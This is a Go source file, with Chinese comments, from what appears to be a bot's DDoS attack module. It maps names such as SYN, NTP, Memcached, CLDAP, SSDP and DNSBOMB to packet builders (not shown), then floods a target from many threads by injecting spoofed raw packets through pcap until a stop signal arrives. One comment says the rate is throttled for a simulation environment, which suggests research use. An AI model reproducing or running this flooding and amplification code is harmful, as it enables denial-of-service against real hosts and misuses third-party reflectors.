package attack

import (
	"bot/packetbuilder/protocol"
	"fmt"
	"sync"
	"time"
	"context"
	"github.com/google/gopacket/pcap"
)

// AttackMethod 定义攻击方法签名，接受 *Layer4 作为接收器
type AttackMethod func(l *Layer4) ([][]byte, error)

// 注册攻击方法
var attackMethods = map[string]AttackMethod{
	"UDP":          (*Layer4).udpPacket,
	"DNSA":         (*Layer4).dnsaPacket,
	"DNS":          (*Layer4).dnsnsPacket,
	"SYN":          (*Layer4).synPacket,
	"RDP":          (*Layer4).rdpPacket,
	"CLDAP":        (*Layer4).cldapPacket,
	"MEMCACHED":    (*Layer4).memcachedPacket,
	"ARD":          (*Layer4).ardPacket,
	"NTP":          (*Layer4).ntpPacket,
	"SSDP":         (*Layer4).ssdpPacket,
	"CHARGEN":      (*Layer4).chargenPacket,
	"SNMP":         (*Layer4).snmpPacket,
	"OPENVPN":      (*Layer4).openvpnPacket,
	"TFTP":         (*Layer4).tftpPacket,
	"DNSBOMB":      (*Layer4).dnsBomb,      // 24年IEEE S&P论文提出的脉冲攻击
	"DNSBOOMERANG": (*Layer4).dnsBoomerang, // 新提出脉冲型DDoS攻击
}

func (l *Layer4) StartAttack() {
	InitBandwidthLimiter() // 初始化带宽限制

	// 根据攻击方法获取攻击函数
	method, exists := attackMethods[l.Method]
	if !exists {
		fmt.Printf("不支持的攻击方法: %v\n", l.Method)
		return
	}
	if l.Method == "DNSBOMB" || l.Method == "DNSBOOMERANG" {
		fmt.Println("DNSBOMB or DNSBOOMERANG")
		directAttack := attackMethods[l.Method]
		for i := 0; i < 10*l.ThreadCount; i++ {
			go directAttack(l)
		}
		time.Sleep(20 * time.Second)
		return
	}

	// 调用泛洪攻击方法，传入攻击方法
	l.floodAttack(method)
}

// 泛洪攻击通用函数
func (l *Layer4) floodAttack(packetsBuilder AttackMethod) {
	var wg sync.WaitGroup

	// 使用 AttackMethod 执行攻击方法
	packets, err := packetsBuilder(l) // 传递 *Layer4 实例
	if err != nil {
		fmt.Println(err)
		return
	}

	// 启动多个线程进行攻击
	for i := 0; i < l.ThreadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			l.attack(packets)
		}()
	}

	// 等待所有线程完成
	wg.Wait()
}

// 由于仿真环境计算资源有限，为了避免过度消耗资源，需要控制攻击速率
func (l *Layer4) attack(packets [][]byte) {
	// 获取网络接口并打开
	interfaceName, _, err := protocol.FindInterface(l.DstIP)
	if err != nil {
		fmt.Printf("没有可用的网络接口: %v\n", err)
		return
	}
	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("无法打开设备: %v\n", err)
		return
	}
	defer handle.Close()

	// 发送伪造的攻击包
	for {
		select {
		case <-STOP:
			fmt.Println("攻击结束")
			return
		default:
			for _, packet := range packets {
				// 在发送前等待带宽令牌
				if bandwidthLimiter != nil {
					pktSize := len(packet)
					if err := bandwidthLimiter.WaitN(context.Background(), pktSize); err != nil {
						return
					}
				}

				if err := handle.WritePacketData(packet); err != nil {
					fmt.Printf("发送伪造数据包失败: %v\n", err)
					return
				}
			}
		}
	}
}
